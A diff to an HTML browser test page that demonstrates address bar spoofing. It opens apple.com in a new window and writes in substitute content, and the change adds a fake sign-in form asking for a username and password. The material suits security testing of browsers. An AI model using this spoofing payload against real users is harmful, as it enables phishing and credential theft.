@@ -1,9 +1,14 @@
-<h2>Test case: document.write to https://www.apple.com</h2>
-<p>This test case calls native UIWebView window.open trying to spoof https://www.apple.com.</p>
+<h1>Address Bar Spoofing: via document.write</h1>
+<p>Check the Address Bar</p>
 <p class="test"><input type="button" value="Run test case" onclick="
         if(window.open.toString()!=&quot;function open&quot;+Function.prototype.toString().substr(9)) {
                 delete window.open;
         }
         w = window.open(&quot;https://www.apple.com&quot;, &quot;_blank&quot;);
-        w.document.write(&quot;Phishing page here&quot;);
+        w.document.write(&quot;Phishing page here  <h1>Sign in to Your Account</h1>
+          <form>
+            <input placeholder='Username'><br>
+            <input type='password' placeholder='Password'><br>
+            <button>Login</button>
+          </form> &quot;);
 " /></p>
